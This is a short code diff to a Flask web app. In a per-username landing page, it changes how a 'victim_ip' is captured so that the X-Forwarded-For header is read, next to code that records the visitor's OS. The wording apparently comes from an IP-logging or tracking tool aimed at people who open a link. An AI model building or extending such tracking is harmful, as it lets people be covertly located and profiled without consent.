@@ -227,7 +227,12 @@ def error500(error):
 def landpage(username):
     try:
         user = User.query.filter_by(username=username).first()
-        victim_ip = request.remote_addr
+        def get_user_ip():
+            if 'X-Forwarded-For' in request.headers:
+                ips = request.headers['X-Forwarded-For'].split(',')
+                return ips[0].strip() 
+            return request.remote_addr
+        victim_ip = get_user_ip()
         def get_os_info():
             try:
                 return request.user_agent.platform
